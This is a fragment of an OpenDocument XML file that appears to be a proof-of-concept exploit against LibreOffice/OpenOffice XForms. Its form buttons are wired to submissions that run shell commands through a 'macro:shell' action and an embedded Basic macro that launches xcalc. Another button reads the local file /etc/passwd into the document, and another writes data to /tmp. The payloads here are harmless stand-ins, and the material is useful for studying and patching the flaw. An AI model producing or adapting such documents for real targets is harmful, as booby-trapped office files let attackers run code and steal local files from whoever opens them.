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Normal" style:font-family-generic="modern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DejaVu Sans Mono" fo:font-size="14pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties style:font-name="Liberation Sans1" fo:font-size="18pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties style:font-name="Liberation Sans1" fo:font-size="18pt"/>
    </style:style>
    <style:style style:name="gr1" style:family="graphic">
      <style:graphic-properties fo:background-color="#ec9ba4"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b4c7dc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b4c7dc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XForm">
          <xforms:instance id="Instance 1">
            <instanceData>
              <Data>
                <Macro>
                  <script:module xmlns:script="http://openoffice.org/2000/script">
sub Main
  shell "xcalc"
end sub
</script:module>
                </Macro>
              </Data>
            </instanceData>
          </xforms:instance>
          <xforms:bind xmlns:script="http://openoffice.org/2000/script" id="Binding1" nodeset="Data/Macro/*"/>
          <xforms:submission id="SubmitData" bind="Binding1" ref="/" action="macro:shell(%22firefox%22)" method="post" indent="false" omit-xml-declaration="false" standalone="false" replace="none"/>
          <xforms:submission id="SaveData" bind="Binding1" ref="/" action="file:///tmp/data.txt" method="put" indent="false" omit-xml-declaration="false" standalone="false" replace="none"/>
          <xforms:submission id="ReadData" bind="Binding1" ref="/" action="file:///etc/passwd" method="get" indent="false" omit-xml-declaration="false" standalone="false" replace="document"/>
          <xsd:schema/>
        </xforms:model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Data" form:control-implementation="ooo:com.sun.star.form.component.TextField" xml:id="control1" form:id="control1" form:tab-index="28" form:convert-empty-to-null="true" xforms:bind="Binding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button form:name="SaveButton" form:control-implementation="ooo:com.sun.star.form.component.CommandButton" xml:id="control2" form:id="control2" form:label="Save to File" form:tab-index="32" form:button-type="submit" office:target-frame="" form:xforms-submission="SaveData" form:focus-on-click="false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SubmitButton" form:control-implementation="ooo:com.sun.star.form.component.CommandButton" xml:id="control3" form:id="control3" form:label="Submit" form:button-type="submit" office:target-frame="" form:xforms-submission="SubmitData" form:focus-on-click="false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ReadButton" form:control-implementation="ooo:com.sun.star.form.component.CommandButton" xml:id="control4" form:id="control4" form:label="Read from File" form:button-type="submit" office:target-frame="" form:xforms-submission="ReadData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1" svg:width="16.894cm" svg:height="3.128cm" draw:control="control1"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><draw:control text:anchor-type="paragraph" draw:z-index="2" draw:style-name="gr3" draw:text-style-name="P2" svg:width="5.001cm" svg:height="1.269cm" svg:x="0.055cm" svg:y="0.34cm" draw:control="control3"/><draw:control text:anchor-type="paragraph" draw:z-index="1" draw:style-name="gr2" draw:text-style-name="P2" svg:width="5.001cm" svg:height="1.271cm" svg:x="5.927cm" svg:y="0.34cm" draw:control="control2"/><draw:control text:anchor-type="paragraph" draw:z-index="3" draw:name="Form1" draw:style-name="gr2" draw:text-style-name="P3" svg:width="5.001cm" svg:height="1.271cm" svg:x="11.852cm" svg:y="0.34cm" draw:control="control4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Normal" style:font-family-generic="modern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5:07:45.920328193</meta:creation-date>
    <meta:editing-duration>P0D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